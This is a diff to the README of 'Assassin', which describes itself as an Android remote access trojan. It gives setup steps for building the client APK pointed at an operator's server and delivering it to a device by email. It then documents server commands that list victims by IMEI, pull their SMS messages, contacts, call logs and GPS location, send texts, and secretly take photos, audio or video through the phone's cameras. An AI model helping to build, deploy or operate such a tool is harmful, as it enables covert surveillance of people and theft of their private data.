@@ -1,6 +1,6 @@
 # Assassin one of the  best Android RAT 
 
-- betaV1.0
+- beta 1.0.0
 - adapter android Lollipop-Pie
 - commit issues to me 
 ## Construction
@@ -20,11 +20,11 @@
 </br>of course the duration decided by yourself
 
 ## Basement/Environment
-1. Gradle 
-2. JDK1.8
-3. AndroidSdk 
-4. node.js
-5. npm
+- Gradle 
+- JDK1.8
+- AndroidSdk 
+- node.js
+- npm
 ## Usage
 #### 1.Start up The Server
 ```
@@ -48,7 +48,7 @@ vim ./gradle.properties
 edit the SERVER_ADDRESS that you got befroe
 ```
 5. on some rom you should also  enable the adb to install the apk
-</br>if you are not a developer you can install the apk yourself
+6. if you are not a developer you can install the apk yourself
 - post the .apk to your device such as email or other way
 - then install the .apk on folder
 ----
@@ -63,9 +63,52 @@ edit the SERVER_ADDRESS that you got befroe
 ## Instruction to client
 ```
 1. cd /Server
-2. chmod 777 ./assassin.js
-3. ./assassin.js -C
+2. which node
+3. vim ./assassin.js  replace #! /usr/local/bin/node with your own position
+4. chmod 777 ./assassin.js
+5. ./assassin.js -h
 ```
+```
+$ ./assassin.js -h                                                 ‹ruby-2.6.0›
+Usage: assassin [options]
+
+Options:
+  -V, --version             output the version number
+  -a,--assassin <assassin>  select a command post to the clients if you choose the shadow you should input the cmd -t to choose a type between pic/audio/video [sms,contacts,call,gps,shadow] (default: "sms")
+  -C,--Clients              show every client info
+  -d,--address <address>    input a phone num who you want to send a msg
+  -m,--msg <msg>            you should write the msg content, if your command is sms
+  -t,--type <type>          select a type between pic/audio/video and you should input the -l to choose the camera lens [pic,audio,video]
+  -c,--client <client>      select a client to post the command
+  -l,--lens <lens>          which camera lens that you want to open [0,1]
+  -h, --help                output usage information
+```
+### exemples
+| cmd        | -a     |
+| ---------- | :-----------:  | 
+| description| select the command between [sms,contacts,call,gps,shadow]  if you choose the shadow you should also use -t to choose a type between pic/audio/video     | 
+|  example   | ‘’./assassin.js -a sms‘’  ‘’ ./assassin.js -a shadow -t pic ‘’   | 
+|  result   | ERROR:you should input a type with -c to choose a client that you want to send cmd    | 
+----
+
+| cmd        | -C     |
+| ---------- | :-----------:  | 
+| description| show every client info    | 
+|  example   | ‘’./assassin.js -C ‘’   | 
+|  result   | {IMEI:9525238415950202,brand:Nokia,model:CAL-20,version:9.0}   | 
+----
+
+| cmd        | -c     |
+| ---------- | :-----------:  | 
+| description| select a client with its IMEI to post the command    | 
+|  example   | ‘’./assassin.js -a sms -c  9525238415950202 ‘’   | 
+|  result   | { command: 'send_sms_list', IMEI: '184859203' }  | 
+----
+
+
+
+
+## Commands
 
 # Screen Shot
 ### server
